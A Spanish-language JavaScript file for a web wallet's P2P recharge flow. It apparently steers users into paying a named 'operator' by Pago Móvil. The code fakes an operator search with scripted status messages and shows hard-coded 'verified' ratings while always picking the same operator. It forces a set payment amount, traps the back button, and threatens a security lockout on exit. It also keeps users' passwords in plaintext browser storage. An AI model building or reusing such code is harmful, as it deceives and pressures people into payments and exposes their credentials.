const STORAGE_KEYS = {
    BALANCE: 'remeexBalance',
    ACCOUNT_TIER: 'remeexAccountTier',
    LITE_MODE_START: 'remeexLiteModeStart'
};

const SESSION_KEYS = {
    EXCHANGE_RATE: 'remeexSessionExchangeRate'
};


// Valores permitidos para recarga mediante Pago Móvil en homevisa.html
const MOBILE_RECHARGE_AMOUNTS = [25, 30, 35, 40, 45, 50, 100, 250, 500];
const P2P_BLOCK_KEY = 'p2pRechargeBlockedUntil';
const P2P_TIMER_END_KEY = 'p2pTimerEnd';

function isLiteModeActive() {
    const start = parseInt(localStorage.getItem(STORAGE_KEYS.LITE_MODE_START) || '0', 10);
    if (!start) return false;
    const elapsed = Date.now() - start;
    if (elapsed >= 12 * 60 * 60 * 1000) {
        localStorage.removeItem(STORAGE_KEYS.LITE_MODE_START);
        return false;
    }
    return true;
}

function getAccountTier(balanceUsd) {
    if (balanceUsd >= 5001) return 'Uranio Infinite';
    if (balanceUsd >= 2001) return 'Uranio Visa';
    if (balanceUsd >= 1001) return 'Platinum';
    if (balanceUsd >= 501) return 'Bronce';
    return 'Estándar';
}

const balanceData = JSON.parse(localStorage.getItem(STORAGE_KEYS.BALANCE) || '{}');
const BALANCE_USD = balanceData.usd || 0;
const BALANCE_BS = balanceData.bs || 0;
const exchangeData = JSON.parse(
    sessionStorage.getItem(SESSION_KEYS.EXCHANGE_RATE) ||
    localStorage.getItem(SESSION_KEYS.EXCHANGE_RATE) ||
    '{}'
);
const EXCHANGE_RATE = exchangeData.USD_TO_BS || 0;
let forcedValidationAmount = getActiveForcedValidationAmount();
let MIN_RECHARGE_USD = computeMinRechargeUsd(forcedValidationAmount);

// Estado global de la aplicación
const AppState = {
    currentStep: 0,
    maxSteps: 7,
    userData: {},
    selectedAmount: 0,
    selectedUsd: 0,
    selectedOperator: null,
    paymentTimer: null,
    timerDuration: 900, // 15 minutos en segundos
    timerRemaining: 900,
    uploadedFile: null,
    referenceNumber: '',
    
    // Mock de operadores con avatares reales
    operators: [
        {
            id: 1,
            name: 'Dayana Colmenares',
            avatar: 'usuarios/Dayana Colmenares.jpg',
            rating: 4.9,
            operations: 1247,
            responseTime: '1-2 min',
            verified: true,
            premium: true,
            bank: 'Banco de Venezuela',
            phone: '0414-123-4567',
            holder: 'Dayana Colmenares',
            idNumber: 'V-12345678'
        },
        {
            id: 2,
            name: 'Francisco Quintero',
            avatar: 'usuarios/Francisco Quintero.jpg',
            rating: 4.8,
            operations: 978,
            responseTime: '1-3 min',
            verified: true,
            premium: false,
            bank: 'Banesco',
            phone: '0424-765-4321',
            holder: 'Francisco Quintero',
            idNumber: 'V-87654321'
        },
        {
            id: 3,
            name: 'Ileana Romero',
            avatar: 'usuarios/Ileana Romero.jpg',
            rating: 4.7,
            operations: 865,
            responseTime: '2-4 min',
            verified: true,
            premium: false,
            bank: 'Banco Mercantil',
            phone: '0412-987-6543',
            holder: 'Ileana Romero',
            idNumber: 'V-11223344'
        },
        {
            id: 4,
            name: 'Juan Tomas Perez',
            avatar: 'usuarios/Juan Tomas Perez.jpg',
            rating: 4.9,
            operations: 1520,
            responseTime: '1-2 min',
            verified: true,
            premium: true,
            bank: 'Banco Provincial',
            phone: '0426-123-9876',
            holder: 'Juan Tomas Perez',
            idNumber: 'V-22334455'
        },
        {
            id: 5,
            name: 'Paola Mendez',
            avatar: 'usuarios/Paola Mendez.jpg',
            rating: 4.6,
            operations: 742,
            responseTime: '2-5 min',
            verified: true,
            premium: false,
            bank: 'Banco Nacional de Crédito',
            phone: '0416-555-8899',
            holder: 'Paola Mendez',
            idNumber: 'V-33445566'
        },
        {
            id: 6,
            name: 'Valentina Guillen',
            avatar: 'usuarios/Valentina Guillen.jpg',
            rating: 4.8,
            operations: 903,
            responseTime: '1-3 min',
            verified: true,
            premium: false,
            bank: 'Banco Exterior',
            phone: '0416-111-2233',
            holder: 'Valentina Guillen',
            idNumber: 'V-44556677'
        }
    ]
};

function getActiveForcedValidationAmount() {
    if (typeof getForcedValidationAmount === 'function') {
        const forced = getForcedValidationAmount();
        if (typeof forced === 'number' && Number.isFinite(forced)) {
            return forced;
        }
    }
    return null;
}

function computeMinRechargeUsd(forcedAmount) {
    if (typeof forcedAmount === 'number' && Number.isFinite(forcedAmount)) {
        return forcedAmount;
    }
    if (typeof getVerificationAmountUsd === 'function') {
        const resolved = getVerificationAmountUsd(BALANCE_USD);
        if (typeof resolved === 'number' && Number.isFinite(resolved)) {
            return resolved;
        }
    }
    return MOBILE_RECHARGE_AMOUNTS.length ? MOBILE_RECHARGE_AMOUNTS[0] : 25;
}

function formatUsdAmount(amount) {
    const numeric = Number(amount);
    return Number.isFinite(numeric) ? numeric.toFixed(2) : '0.00';
}

function getPresetAmounts() {
    const presets = MOBILE_RECHARGE_AMOUNTS.filter(usd => usd >= MIN_RECHARGE_USD);
    const uniquePresets = [];

    presets.sort((a, b) => a - b).forEach(value => {
        if (!uniquePresets.some(existing => Math.abs(existing - value) < 0.0001)) {
            uniquePresets.push(value);
        }
    });

    if (typeof forcedValidationAmount === 'number' && Number.isFinite(forcedValidationAmount)) {
        if (!uniquePresets.some(value => Math.abs(value - forcedValidationAmount) < 0.0001)) {
            uniquePresets.unshift(forcedValidationAmount);
        } else {
            uniquePresets.sort((a, b) => a - b);
            if (uniquePresets[0] !== forcedValidationAmount) {
                const filtered = uniquePresets.filter(value => Math.abs(value - forcedValidationAmount) > 0.0001);
                uniquePresets.length = 0;
                uniquePresets.push(forcedValidationAmount, ...filtered);
            }
        }
    }

    if (!uniquePresets.length) {
        uniquePresets.push(MIN_RECHARGE_USD);
    }

    return uniquePresets;
}

function updateMinAmountUI() {
    const formattedMin = formatUsdAmount(MIN_RECHARGE_USD);
    const minTextEl = document.getElementById('minUsdText');
    if (minTextEl) minTextEl.textContent = formattedMin;
    const minHintEl = document.getElementById('minUsdHint');
    if (minHintEl) minHintEl.textContent = formattedMin;
    const amountInput = document.getElementById('customAmount');
    if (amountInput) amountInput.min = MIN_RECHARGE_USD;
}

function renderPresetOptions() {
    const optionsContainer = document.getElementById('presetOptions');
    if (!optionsContainer) return;

    const amountInput = document.getElementById('customAmount');
    const currentUsd = amountInput ? parseFloat(amountInput.value) : NaN;
    const presets = getPresetAmounts();

    optionsContainer.innerHTML = '';
    let selectionApplied = false;

    presets.forEach(usd => {
        const option = document.createElement('div');
        option.className = 'amount-option';
        option.dataset.usd = String(usd);
        const isMin = Math.abs(usd - MIN_RECHARGE_USD) < 0.0001;
        if (isMin) {
            option.classList.add('recommended');
            const badge = document.createElement('div');
            badge.className = 'recommended-badge';
            badge.textContent = 'Mínimo';
            option.appendChild(badge);
        }

        const amountValue = document.createElement('span');
        amountValue.className = 'amount-value';
        amountValue.textContent = `${formatUsdAmount(usd)} USD`;
        const amountEq = document.createElement('span');
        amountEq.className = 'amount-equivalent';
        amountEq.textContent = `Bs ${(usd * EXCHANGE_RATE).toFixed(2)}`;
        option.appendChild(amountValue);
        option.appendChild(amountEq);

        const isSelected = !Number.isNaN(currentUsd) && Math.abs(currentUsd - usd) < 0.0001;
        if (isSelected) {
            option.classList.add('selected');
            selectionApplied = true;
        }

        option.addEventListener('click', () => {
            document.querySelectorAll('.amount-option').forEach(el => el.classList.remove('selected'));
            option.classList.add('selected');
            if (amountInput) {
                amountInput.value = formatUsdAmount(usd);
                amountInput.dispatchEvent(new Event('input'));
            }
        });

        optionsContainer.appendChild(option);
    });

    if (!selectionApplied && presets.length) {
        const firstOption = optionsContainer.querySelector('.amount-option');
        if (firstOption) firstOption.classList.add('selected');
        if (amountInput) {
            amountInput.value = formatUsdAmount(presets[0]);
            amountInput.dispatchEvent(new Event('input'));
        }
    }
}

function syncCustomAmountWithMin() {
    const amountInput = document.getElementById('customAmount');
    if (!amountInput) return;
    const currentValue = parseFloat(amountInput.value);
    const shouldForce = typeof forcedValidationAmount === 'number' && Number.isFinite(forcedValidationAmount);
    if (shouldForce || Number.isNaN(currentValue) || currentValue < MIN_RECHARGE_USD) {
        amountInput.value = formatUsdAmount(MIN_RECHARGE_USD);
    }
    amountInput.min = MIN_RECHARGE_USD;
    amountInput.dispatchEvent(new Event('input'));
}

function highlightPresetForValue(usd) {
    let matched = false;
    document.querySelectorAll('.amount-option').forEach(option => {
        const optionUsd = parseFloat(option.dataset.usd || '0');
        if (!Number.isNaN(usd) && !Number.isNaN(optionUsd) && Math.abs(optionUsd - usd) < 0.0001) {
            option.classList.add('selected');
            matched = true;
        } else {
            option.classList.remove('selected');
        }
    });
    return matched;
}

function refreshAmountSummaries() {
    const amountInput = document.getElementById('customAmount');
    const rawUsd = amountInput ? parseFloat(amountInput.value) : NaN;
    const normalizedUsd = Number.isFinite(rawUsd) ? Math.max(rawUsd, MIN_RECHARGE_USD) : MIN_RECHARGE_USD;
    const usdAmount = Number.isFinite(normalizedUsd) ? normalizedUsd : MIN_RECHARGE_USD;
    const bsAmount = usdAmount * EXCHANGE_RATE;

    AppState.selectedAmount = bsAmount;
    AppState.selectedUsd = usdAmount;

    updateAmountSummary(bsAmount, usdAmount);
    updateTransactionSummary();

    const receivedUsdtEl = document.getElementById('receivedUsdt');
    const newBalanceEl = document.getElementById('newBalance');
    if (receivedUsdtEl || newBalanceEl) {
        const usdtValue = EXCHANGE_RATE ? (bsAmount / EXCHANGE_RATE) : usdAmount;
        const formattedUsdt = Number.isFinite(usdtValue) ? usdtValue.toFixed(2) : usdAmount.toFixed(2);
        if (receivedUsdtEl) {
            receivedUsdtEl.textContent = `${formattedUsdt} USDT`;
        }
        if (newBalanceEl) {
            const projectedBalance = BALANCE_USD + parseFloat(formattedUsdt);
            newBalanceEl.textContent = `${projectedBalance.toFixed(2)} USDT`;
        }
    }

    highlightPresetForValue(usdAmount);
}

// Inicialización
document.addEventListener('DOMContentLoaded', () => {
    if (checkP2PBlock()) return;
    initializeApp();
    loadSavedData();
    setupEventListeners();
    populateInitialData();
    updateProgress();
    updateLayout();
});

const forcedEventTarget = (typeof window !== 'undefined' && typeof window.addEventListener === 'function')
    ? window
    : (typeof document !== 'undefined' ? document : null);
if (forcedEventTarget) {
    forcedEventTarget.addEventListener('forcedValidationAmountChanged', () => {
        forcedValidationAmount = getActiveForcedValidationAmount();
        MIN_RECHARGE_USD = computeMinRechargeUsd(forcedValidationAmount);
        updateMinAmountUI();
        renderPresetOptions();
        syncCustomAmountWithMin();
        refreshAmountSummaries();
    });
}

function getBankLogoByName(name) {
    if (!name || !window.BANK_DATA) return '';
    const allBanks = [...(BANK_DATA.NACIONAL || []), ...(BANK_DATA.INTERNACIONAL || []), ...(BANK_DATA.FINTECH || [])];
    const bank = allBanks.find(b => b.name.toLowerCase() === name.toLowerCase());
    return bank ? bank.logo : '';
}

// Actualiza variables de tamaño para evitar solapamiento con el header
function updateLayout() {
    const header = document.querySelector('.header-container');
    const progress = document.querySelector('.progress-container');
    if (header && progress) {
        const headerHeight = header.offsetHeight;
        const progressHeight = progress.offsetHeight;
        document.documentElement.style.setProperty('--header-height', `${headerHeight}px`);
        document.documentElement.style.setProperty('--progress-height', `${progressHeight}px`);
    }
}

// Recalcular dimensiones en cambios de tamaño
window.addEventListener('resize', updateLayout);

function checkP2PBlock() {
    const blockedUntil = parseInt(localStorage.getItem(P2P_BLOCK_KEY) || '0', 10);
    if (Date.now() < blockedUntil) {
        const minutes = Math.ceil((blockedUntil - Date.now()) / 60000);
        showModal('Cuenta bloqueada', `Por medidas de seguridad tu cuenta está bloqueada temporalmente por ${minutes} minutos.`);
        const startBtn = document.getElementById('startBtn');
        if (startBtn) startBtn.disabled = true;
        return true;
    }
    return false;
}

// Inicializar aplicación
function initializeApp() {
    console.log('Iniciando aplicación P2P...');
    
    // Verificar si hay datos guardados
    const savedStep = localStorage.getItem('p2p_current_step');
    if (savedStep && parseInt(savedStep) > 0) {
        navigateToStep(parseInt(savedStep));
    }
}

// Cargar datos guardados
function loadSavedData() {
    let savedUserData = localStorage.getItem('p2p_user_data');
    if (!savedUserData) {
        let regDataRaw = localStorage.getItem('visaUserData');
        if (!regDataRaw) {
            regDataRaw = sessionStorage.getItem('remeexUser');
        }
        if (regDataRaw) {
            const reg = JSON.parse(regDataRaw);
            const name = reg.fullName || reg.preferredName || reg.name || `${reg.firstName || ''} ${reg.lastName || ''}`.trim();
            AppState.userData = {
                name,
                email: reg.email || '',
                password: reg.password || ''
            };
            savedUserData = JSON.stringify(AppState.userData);
            localStorage.setItem('p2p_user_data', savedUserData);
        }
    }
    if (savedUserData) {
        AppState.userData = JSON.parse(savedUserData);
        fillFormData();
    }

    const savedAmount = localStorage.getItem('p2p_selected_amount');
    if (savedAmount) {
        AppState.selectedAmount = parseFloat(savedAmount);
        const amountInput = document.getElementById('customAmount');
        if (amountInput) {
            const normalizedUsd = EXCHANGE_RATE ? (AppState.selectedAmount / EXCHANGE_RATE) : MIN_RECHARGE_USD;
            const usdValue = Number.isFinite(normalizedUsd) ? normalizedUsd : MIN_RECHARGE_USD;
            const finalUsd = Math.max(usdValue, MIN_RECHARGE_USD);
            AppState.selectedUsd = finalUsd;
            AppState.selectedAmount = finalUsd * EXCHANGE_RATE;
            amountInput.value = formatUsdAmount(finalUsd);
            amountInput.dispatchEvent(new Event('input'));
            refreshAmountSummaries();
            const searchBtn = document.getElementById('searchOperators');
            if (searchBtn) searchBtn.disabled = false;
        }
    }
}

// Configurar event listeners
function setupEventListeners() {
    // Botón de inicio
    const startBtn = document.getElementById('startBtn');
    if (startBtn) {
        startBtn.addEventListener('click', () => {
            localStorage.removeItem('p2pPaymentConfirmed');
            navigateToStep(1);
        });
    }
    
    // Botón atrás
    const backBtn = document.getElementById('backBtn');
    if (backBtn) {
        backBtn.addEventListener('click', goBack);
    }
    
    // Step 1: Registro
    setupRegistrationForm();
    
    // Step 2: Selección de monto
    setupAmountSelection();
    
    // Step 4: Cambiar operador
    const changeOperatorBtn = document.getElementById('changeOperator');
    if (changeOperatorBtn) {
        changeOperatorBtn.addEventListener('click', () => {
            AppState.selectedOperator = null;
            navigateToStep(3);
        });
    }
    
    const continueOperatorBtn = document.getElementById('continueWithOperator');
    if (continueOperatorBtn) {
        continueOperatorBtn.addEventListener('click', () => navigateToStep(5));
    }
    
    // Step 5: Pago
    setupPaymentStep();
    
    // Step 6: Upload
    setupUploadStep();
    
    // Step 7: Dashboard
    const dashboardBtn = document.getElementById('goToDashboard');
    if (dashboardBtn) {
        dashboardBtn.addEventListener('click', () => {
            showToast('success', 'Redirigiendo al panel principal...');
            setTimeout(() => {
                localStorage.clear();
                window.location.href = 'accesoamicuenta.html';
            }, 2000);
        });
    }

    // Configurar overlay de salida
    setupExitOverlay();
}

function showExitOverlay() {
    const overlay = document.getElementById('exitOverlay');
    if (overlay) overlay.classList.add('active');
}

function hideExitOverlay() {
    const overlay = document.getElementById('exitOverlay');
    if (overlay) overlay.classList.remove('active');
}

function setupExitOverlay() {
    history.pushState(null, '', window.location.href);

    const stayBtn = document.getElementById('stayBtn');
    const exitBtn = document.getElementById('exitBtn');

    if (stayBtn) {
        stayBtn.addEventListener('click', () => {
            hideExitOverlay();
            history.pushState(null, '', window.location.href);
        });
    }

    if (exitBtn) {
        exitBtn.addEventListener('click', () => {
            const LOCK_MS = 5 * 60 * 1000; // 5 minutos de bloqueo
            localStorage.setItem('p2pLockedUntil', Date.now() + LOCK_MS);
            localStorage.removeItem(P2P_TIMER_END_KEY);
            window.location.href = 'homevisa.html';
        });
    }

    window.addEventListener('popstate', () => {
        if (AppState.currentStep === 3 || AppState.currentStep === 4 || AppState.currentStep === 5) {
            showExitOverlay();
            history.pushState(null, '', window.location.href);
        }
    });
}

function populateInitialData() {
    const rateEl = document.querySelector('.rate-value:not(.success)');
    if (rateEl && EXCHANGE_RATE) {
        rateEl.textContent = `${EXCHANGE_RATE.toFixed(2)} Bs/USDT`;
    }

    updateMinAmountUI();
    renderPresetOptions();
    syncCustomAmountWithMin();
    refreshAmountSummaries();

    const balUsdEl = document.getElementById('balanceUsd');
    if (balUsdEl) balUsdEl.textContent = `${BALANCE_USD.toFixed(2)} USD`;
    const balBsEl = document.getElementById('balanceBs');
    if (balBsEl) balBsEl.textContent = `Bs ${BALANCE_BS.toFixed(2)}`;
}

// Setup formulario de registro
function setupRegistrationForm() {
    const form = document.getElementById('registrationForm');
    if (!form) return;
    
    const inputs = form.querySelectorAll('input');
    const continueBtn = document.getElementById('continueStep1');
    
    // Validación en tiempo real
    inputs.forEach(input => {
        input.addEventListener('input', () => {
            validateField(input);
            checkFormValidity();
        });
        
        input.addEventListener('blur', () => {
            validateField(input);
        });
    });
    
    // Toggle contraseña
    const passwordToggle = document.getElementById('passwordToggle');
    const passwordInput = document.getElementById('userPassword');
    
    if (passwordToggle && passwordInput) {
        passwordToggle.addEventListener('click', () => {
            const type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordInput.type = type;
            
            // Cambiar icono
            const icon = passwordToggle.querySelector('svg');
            if (type === 'password') {
                icon.innerHTML = '<path d="M1 12S5 5 12 5S23 12 23 12S19 19 12 19S1 12 1 12Z"/><circle cx="12" cy="12" r="3"/>';
            } else {
                icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20C7 20 2.73 16.18 1 12C2.73 7.82 7 4 12 4C14.12 4 16.16 4.65 17.94 5.77M20.67 8.33C21.53 9.54 22.27 10.84 23 12C21.27 16.18 17 20 12 20"/><path d="M1 1L23 23"/>';
            }
        });
    }
    
    // Continuar
    if (continueBtn) {
        continueBtn.addEventListener('click', (e) => {
            e.preventDefault();
            if (validateRegistrationForm()) {
                saveUserData();
                navigateToStep(2);
            }
        });
    }
    
    // Validar campo individual
    function validateField(input) {
        const errorEl = document.getElementById(`${input.id}-error`);
        let isValid = true;
        let errorMsg = '';
        
        if (input.required && !input.value.trim()) {
            isValid = false;
            errorMsg = 'Este campo es obligatorio';
        } else if (input.type === 'email' && input.value) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(input.value)) {
                isValid = false;
                errorMsg = 'Ingresa un correo válido';
            }
        } else if (input.id === 'userPassword' && input.value) {
            const strength = calculatePasswordStrength(input.value);
            updatePasswordStrength(strength);
            if (input.value.length < 8) {
                isValid = false;
                errorMsg = 'La contraseña debe tener al menos 8 caracteres';
            }
        }
        
        if (errorEl) {
            errorEl.textContent = errorMsg;
            input.classList.toggle('error', !isValid);
        }
        
        return isValid;
    }
    
    // Calcular fuerza de contraseña
    function calculatePasswordStrength(password) {
        let strength = 0;
        if (password.length >= 8) strength++;
        if (password.length >= 12) strength++;
        if (/[a-z]/.test(password) && /[A-Z]/.test(password)) strength++;
        if (/\d/.test(password)) strength++;
        if (/[^a-zA-Z\d]/.test(password)) strength++;
        return Math.min(strength, 4);
    }
    
    // Actualizar indicador de fuerza
    function updatePasswordStrength(strength) {
        const strengthFill = document.querySelector('.password-strength-fill');
        const strengthText = document.querySelector('.password-strength-text');
        
        if (strengthFill) {
            strengthFill.setAttribute('data-strength', strength);
        }
        
        if (strengthText) {
            const labels = ['', 'Débil', 'Regular', 'Buena', 'Excelente'];
            strengthText.textContent = labels[strength] ? `Fuerza: ${labels[strength]}` : 'Fuerza de la contraseña';
        }
    }
    
    // Verificar validez del formulario
    function checkFormValidity() {
        const allValid = Array.from(inputs).every(input => validateField(input));
        if (continueBtn) {
            continueBtn.disabled = !allValid;
        }
    }
    
    // Validar formulario completo
    function validateRegistrationForm() {
        let isValid = true;
        inputs.forEach(input => {
            if (!validateField(input)) {
                isValid = false;
            }
        });
        return isValid;
    }
    
    // Guardar datos del usuario
    function saveUserData() {
        AppState.userData = {
            name: document.getElementById('userName').value,
            email: document.getElementById('userEmail').value,
            password: document.getElementById('userPassword').value
        };
        localStorage.setItem('p2p_user_data', JSON.stringify(AppState.userData));
    }
}

// Setup selección de monto
function setupAmountSelection() {
    const amountInput = document.getElementById('customAmount');
    const searchBtn = document.getElementById('searchOperators');
    const errorEl = document.getElementById('customAmountError');

    if (!amountInput) return;

    amountInput.addEventListener('input', () => {
        const usd = parseFloat(amountInput.value);
        if (!isNaN(usd) && usd >= MIN_RECHARGE_USD) {
            if (errorEl) errorEl.textContent = '';
            const bs = usd * EXCHANGE_RATE;
            AppState.selectedAmount = bs;
            AppState.selectedUsd = usd;
            localStorage.setItem('p2p_selected_amount', bs);
            refreshAmountSummaries();
            if (searchBtn) searchBtn.disabled = false;
        } else {
            AppState.selectedAmount = 0;
            AppState.selectedUsd = 0;
            if (errorEl) errorEl.textContent = `El monto mínimo es ${formatUsdAmount(MIN_RECHARGE_USD)} USD`;
            const summaryEl = document.getElementById('amountSummary');
            if (summaryEl) summaryEl.style.display = 'none';
            if (searchBtn) searchBtn.disabled = true;
            highlightPresetForValue(NaN);
        }
    });

    // Botón buscar operadores
    if (searchBtn) {
        searchBtn.addEventListener('click', () => {
            navigateToStep(3);
            startOperatorSearch();
        });
    }
}

// Actualizar resumen de monto
function updateAmountSummary(bsAmount, usdAmount) {
    const summaryEl = document.getElementById('amountSummary');
    const summaryBs = document.getElementById('summaryBs');
    const summaryUsdt = document.getElementById('summaryUsdt');

    if (summaryEl) {
        summaryEl.style.display = 'block';
    }

    if (summaryBs) {
        summaryBs.textContent = `Bs ${bsAmount.toFixed(2)}`;
    }

    if (summaryUsdt) {
        summaryUsdt.textContent = `${usdAmount.toFixed(2)} USDT`;
    }
}

// Iniciar búsqueda de operadores
function startOperatorSearch() {
    const statusText = document.querySelector('.search-status .status-text');
    const operatorsDots = document.getElementById('operatorsDots');
    const progressFill = document.getElementById('radarProgress');

    // Limpiar puntos anteriores
    if (operatorsDots) {
        operatorsDots.innerHTML = '';
    }
    if (progressFill) {
        progressFill.style.width = '0%';
    }

    // Progreso visual
    let progress = 0;
    const progressInterval = setInterval(() => {
        progress += 20;
        if (progressFill) progressFill.style.width = progress + '%';
        if (progress >= 100) clearInterval(progressInterval);
    }, 2000);

    // Simular búsqueda progresiva
    const searchSteps = [
        { text: 'Escaneando la red P2P en busca de operadores confiables...', delay: 0 },
        { text: 'Conectando con operadores verificados disponibles...', delay: 2000 },
        { text: 'Verificando disponibilidad y límites de cada operador...', delay: 4000 },
        { text: 'Analizando las mejores opciones para ti...', delay: 6000 },
        { text: 'Operadores encontrados. Preparando sugerencias...', delay: 8000 }
    ];

    searchSteps.forEach(step => {
        setTimeout(() => {
            if (statusText) {
                statusText.textContent = step.text;
            }
        }, step.delay);
    });

    // Mostrar puntos de operadores en el radar
    setTimeout(() => {
        showOperatorDots();
    }, 3000);

    // Mostrar preview de operadores
    setTimeout(() => {
        showOperatorsPreview();
    }, 7000);

    // Selección automática del mejor operador
    setTimeout(() => {
        selectBestOperator();
    }, 10000);
}

// Mostrar puntos de operadores en el radar
function showOperatorDots() {
    const container = document.getElementById('operatorsDots');
    if (!container) return;
    
    const positions = [
        { top: '30%', left: '45%', premium: true },
        { top: '55%', left: '30%', premium: false },
        { top: '45%', left: '65%', premium: true },
        { top: '70%', left: '50%', premium: false },
        { top: '25%', left: '60%', premium: false },
        { top: '20%', left: '35%', premium: true }
    ];
    
    positions.forEach((pos, index) => {
        setTimeout(() => {
            const dot = document.createElement('div');
            dot.className = `operator-dot ${pos.premium ? 'premium' : ''}`;
            dot.style.top = pos.top;
            dot.style.left = pos.left;
            dot.style.animationDelay = `${index * 0.2}s`;
            container.appendChild(dot);
        }, index * 300);
    });
}

// Mostrar preview de operadores
function showOperatorsPreview() {
    const previewContainer = document.getElementById('operatorsPreview');
    const previewGrid = document.getElementById('previewGrid');
    
    if (!previewContainer || !previewGrid) return;
    
    previewContainer.style.display = 'block';
    previewContainer.classList.add('show');
    previewGrid.innerHTML = '';
    
    // Mostrar operadores con animación de eliminación
    AppState.operators.forEach((operator, index) => {
        const preview = createOperatorPreview(operator);
        preview.style.animationDelay = `${index * 0.2}s`;
        previewGrid.appendChild(preview);
    });
    
    // Eliminar operadores progresivamente
    setTimeout(() => {
        eliminateOperators();
    }, 2000);
}

// Crear preview de operador
function createOperatorPreview(operator) {
    const div = document.createElement('div');
    div.className = 'operator-preview';
    div.dataset.operatorId = operator.id;
    
    div.innerHTML = `
        <div class="operator-avatar"><img src="${operator.avatar}" alt="${operator.name}"></div>
        <div class="operator-info">
            <div class="operator-name">${operator.name}</div>
            <div class="operator-rating">⭐ ${operator.rating} • ${operator.operations} operaciones</div>
        </div>
        ${operator.premium ? '<span class="operator-badge premium">Premium</span>' : ''}
    `;
    
    return div;
}

// Eliminar operadores progresivamente
function eliminateOperators() {
    const previews = document.querySelectorAll('.operator-preview');
    previews.forEach((preview, index) => {
        if (index !== 0) {
            setTimeout(() => {
                preview.style.opacity = '0.3';
                preview.style.transform = 'scale(0.95)';
            }, index * 1000);
        }
    });
}

// Seleccionar mejor operador
function selectBestOperator() {
    AppState.selectedOperator = AppState.operators[0]; // Dayana Colmenares
    navigateToStep(4);
    displaySelectedOperator();
}

// Mostrar operador seleccionado
function displaySelectedOperator() {
    const card = document.getElementById('selectedOperatorCard');
    if (!card || !AppState.selectedOperator) return;
    
    const operator = AppState.selectedOperator;
    
    card.innerHTML = `
        <div class="operator-header">
            <div class="operator-avatar"><img src="${operator.avatar}" alt="${operator.name}"></div>
            <div class="operator-details">
                <div class="operator-name">${operator.name}</div>
                <div class="operator-stats">
                    <span>⭐ ${operator.rating}</span>
                    <span>•</span>
                    <span>${operator.operations} operaciones</span>
                    <span>•</span>
                    <span>${operator.responseTime}</span>
                </div>
                <div class="operator-badges">
                    <span class="operator-badge">✓ Verificado</span>
                    ${operator.premium ? '<span class="operator-badge premium">Premium</span>' : ''}
                </div>
            </div>
        </div>
    `;
    
    // Actualizar resumen de transacción
    updateTransactionSummary();
}

// Actualizar resumen de transacción
function updateTransactionSummary() {
    const amountEl = document.getElementById('finalAmount');
    const usdtEl = document.getElementById('finalUsdt');

    if (amountEl) {
        amountEl.textContent = `Bs ${AppState.selectedAmount.toFixed(2)}`;
    }

    if (usdtEl) {
        const rawUsdt = EXCHANGE_RATE ? (AppState.selectedAmount / EXCHANGE_RATE) : AppState.selectedUsd;
        const usdt = Number.isFinite(rawUsdt) ? rawUsdt : AppState.selectedUsd;
        usdtEl.textContent = `${(usdt || 0).toFixed(2)} USDT`;
    }

    // Actualizar tarjeta de saldo
    const currentEl = document.getElementById('balanceCurrent');
    const rechargeEl = document.getElementById('balanceRecharge');
    const afterEl = document.getElementById('balanceAfter');
    const currentBar = document.getElementById('balanceCurrentBar');
    const rechargeBar = document.getElementById('balanceRechargeBar');

    if (currentEl && rechargeEl && afterEl) {
        const current = BALANCE_BS;
        const recharge = AppState.selectedAmount;
        const total = current + recharge;
        const format = n => n.toLocaleString('es-VE', {minimumFractionDigits: 2, maximumFractionDigits: 2});

        currentEl.textContent = `Bs ${format(current)}`;
        rechargeEl.textContent = `Bs ${format(recharge)}`;
        afterEl.textContent = `Bs ${format(total)}`;

        if (currentBar && rechargeBar) {
            const currentPct = total > 0 ? (current / total) * 100 : 0;
            const rechargePct = total > 0 ? (recharge / total) * 100 : 0;
            currentBar.style.width = `${currentPct}%`;
            rechargeBar.style.width = `${rechargePct}%`;
        }
    }
}

// Setup paso de pago
function setupPaymentStep() {
    const confirmBtn = document.getElementById('confirmPayment');
    const cancelBtn = document.getElementById('cancelPayment');

    if (cancelBtn && localStorage.getItem('p2pPaymentConfirmed') === 'true') {
        cancelBtn.disabled = true;
        cancelBtn.style.display = 'none';
    }
    
    // Botones de copiar
    document.querySelectorAll('.copy-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const targetId = btn.dataset.copy;
            const targetEl = document.getElementById(targetId);

            if (targetEl) {
                const textToCopy = targetEl.dataset.copyValue || targetEl.textContent;
                copyToClipboard(textToCopy);
                
                // Feedback visual
                btn.classList.add('copied');
                const originalHTML = btn.innerHTML;
                btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M20 6L9 17L4 12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>';
                
                setTimeout(() => {
                    btn.classList.remove('copied');
                    btn.innerHTML = originalHTML;
                }, 2000);
            }
        });
    });

    // Slider de datos
    const slider = document.getElementById('dataSlider');
    const prev = document.getElementById('prevSlide');
    const next = document.getElementById('nextSlide');
    if (slider && prev && next) {
        const slides = slider.querySelectorAll('.slide');
        let index = 0;
        const update = () => {
            slider.style.transform = `translateX(-${index * 100}%)`;
        };
        prev.addEventListener('click', () => {
            index = (index - 1 + slides.length) % slides.length;
            update();
        });
        next.addEventListener('click', () => {
            index = (index + 1) % slides.length;
            update();
        });
        let startX = 0;
        slider.addEventListener('touchstart', e => {
            startX = e.touches[0].clientX;
        });
        slider.addEventListener('touchend', e => {
            const diff = e.changedTouches[0].clientX - startX;
            if (diff > 50) {
                index = (index - 1 + slides.length) % slides.length;
            } else if (diff < -50) {
                index = (index + 1) % slides.length;
            }
            update();
        });
    }

    // Confirmar pago
    if (confirmBtn) {
        confirmBtn.addEventListener('click', () => {
            stopTimer();
            localStorage.removeItem(P2P_TIMER_END_KEY);
            localStorage.setItem('p2pPaymentConfirmed', 'true');
            if (cancelBtn) {
                cancelBtn.disabled = true;
                cancelBtn.style.display = 'none';
            }
            navigateToStep(6);
        });
    }

    // Cancelar pago
    if (cancelBtn && cancelBtn.disabled !== true) {
        cancelBtn.addEventListener('click', showCancellationForm);
    }
}

function showCancellationForm() {
    const body = `
        <div class="form-group">
            <label for="cancelReason" class="form-label">¿Por qué no completaste el pago P2P?</label>
            <select id="cancelReason" class="form-input">
                <option value="better-price">Encontré un mejor precio</option>
                <option value="technical">Tuve un problema técnico</option>
                <option value="change-mind">Simplemente cambié de opinión</option>
                <option value="fraud">Estafa</option>
            </select>
        </div>`;

